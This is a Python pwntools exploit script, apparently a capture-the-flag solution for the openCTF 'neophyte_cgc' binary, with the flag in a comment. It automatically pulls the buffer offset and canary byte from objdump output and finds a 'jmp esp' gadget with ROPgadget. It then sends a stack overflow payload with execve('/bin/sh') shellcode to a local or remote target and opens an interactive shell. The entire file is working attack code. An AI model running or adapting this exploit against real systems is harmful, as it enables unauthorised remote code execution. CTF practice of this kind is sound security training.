#!/usr/bin/env python

from pwn import *
import sys

# flag DontGetAngr_y___IT_WILL_GET_WORSE

def exploit(r):
	if len(sys.argv) > 1:
		r.recvuntil("Neophyte CGC - Baby's first CRS (Cyber Reasoning System)\n")
		binary = r.recvuntil('Can you exploit me in under 10 seconds?\n')

		ofile = open('neo_drop', 'wb')
		ofile.write(binary)
		ofile.close()

	else:
		binary = bytearray(open('neophyte_cgc', 'r').read())
	
	entry = u32(binary[0x18:0x18+4])
	log.info("Entry point: " + hex(entry))

	output = subprocess.Popen(["objdump", "-d", "-M", "intel", "neophyte_cgc"], stdout=subprocess.PIPE).communicate()[0].split('\n')

	for line in range(len(output)):
		l = output[line].split(' ')
		if '<vulnerable>:' in l:
			stack = int(output[line+3].split(' ')[-1].split(',')[-1], 16) + 4
			if 'sub' in output[line+5]:
				stack += int(output[line+5].split(' ')[-1].split(',')[-1], 16)
			for lv in range(15):
				if 'lea ' in output[line+lv]:
					bufOffset = int(output[line+lv].split(' ')[-1].split(',')[-1].split('-')[-1].strip(']'), 16)
		if '<main>:' in output[line]:
			for i in range(30):
				if 'getchar' in output[line+i]:
					for x in range(5):
						if 'cmp' in output[line+i+x]:
							canary_byte = chr(int(output[line+i+x].split(',')[-1], 16))
							print canary_byte
		if '<__libc_csu_init>:' in l:
			break

	rop_gadget = subprocess.Popen(["ROPgadget", "--binary", "neophyte_cgc", "--only", "jmp|call"], stdout=subprocess.PIPE).communicate()[0].split('\n')

	for line in rop_gadget:
		if 'jmp esp' in line or 'call esp' in line:
			gadget = int(line.split(' ')[0], 16)
			log.info("Rop gadget found: " + line)

	r.send(canary_byte)
	r.recvuntil('good gatekeeper')

	offset = stack - (stack - bufOffset)

	payload = "A" * offset
	payload += "BBBB"
	payload += p32(gadget)
	payload += ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  		"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/neophyte_cgc'])
        print util.proc.pidof(r)
        pause()
        exploit(r)